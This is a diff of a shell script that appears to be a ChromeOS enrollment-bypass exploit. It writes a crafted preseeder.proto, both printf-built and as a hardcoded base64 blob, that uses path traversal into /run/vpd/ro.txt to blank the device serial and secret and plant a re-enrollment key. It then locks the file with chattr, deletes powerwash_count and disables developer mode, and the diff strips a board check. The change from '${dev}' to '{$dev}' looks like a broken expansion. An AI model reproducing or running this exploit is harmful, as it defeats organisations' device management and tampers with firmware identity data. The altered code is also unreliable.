@@ -1,22 +1,11 @@
-#!/bin/sh
+#!/bin/bash
 
-TMPFILE=$(mktemp)
-flashrom -i GBB -r "$TMPFILE" 
-futility gbb -g --recoverykey="${TMPFILE}.vbpubk" "$TMPFILE"
-keysum=$(futility show "${TMPFILE}.vbpubk" | grep "Key sha1sum" | sed "s/ *Key sha1sum: *//")
-rm -f "$TMPFILE" "${TMPFILE}.vbpubk"
-[[ "$keysum" =~ ^(7f275e9b2a841aae9a8f2f9f747568d6811ef873|10a46dba75ef67320422fe73148feb321d723cde|95cb0cf50bc56c978911ff5cbfda056bac3f928f|25848abcfbf60ba03d4860a395d370224fc99652)$ ]] || { echo "Unsupported board!"; exit 1; }
-
-stateful_mount="/stateful"
-
+stateful_mount=$(mktemp -d)
+metadata=$(mktemp -d)
 fail(){
 	printf "$1\n"
 	printf "exiting...\n"
-	exit
-}
-
-ohyeahitspreseedingtime() {
-	printf '\012\271\001\012\043unencrypted/../../../run/vpd/ro.txt\020\213\001\032\216\001\022\213\001serial_number=""\nstable_device_secret_DO_NOT_SHARE=""\nre_enrollment_key="%s"\n' "$1" | base64 | tr -d '\n'
+	exit 1
 }
 
 get_fixed_dst_drive() {
@@ -33,7 +22,7 @@ get_fixed_dst_drive() {
 					;;
 				esac
 			fi
-			DEFAULT_ROOTDEV="${dev}"
+			DEFAULT_ROOTDEV="{$dev}"
 		done
 	fi
 	if [ -z "${DEFAULT_ROOTDEV}" ]; then
@@ -87,12 +76,12 @@ part1(){
 }
 
 part2(){
-    mkdir /metadata
-    mount "$intdis_prefix"11 /metadata
-	ohyeahitspreseedingtime "$(hexdump -e '1/1 "%02x"' -v -n 32 /dev/urandom)" > /metadata/preseeder.proto
-    chattr +i /metadata/preseeder.proto 
+    mkdir "$metadata"
+    mount "$intdis_prefix"11 "$metadata"
+    printf "Cn8KI3VuZW5jcnlwdGVkLy4uLy4uLy4uL3J1bi92cGQvcm8udHh0EFQaVhJUcmVfZW5yb2xsbWVudF9rZXk9IjA0MzIzODMwMjAyNDU3NTYzNDIxNTY5NzMxODQyODE3MjcxNzM5Mjg5MzgyNjUxNzMzNjcwMTIwMDk5MzA0MjMi" | tee "$metadata"/preseeder.proto
+    chattr +i "$metadata"/preseeder.proto 
     sync
-    umount /metadata
+    umount "$metadata"
     sync
     vpd -i RW_VPD -d "powerwash_count"
     crossystem disable_dev_request=1
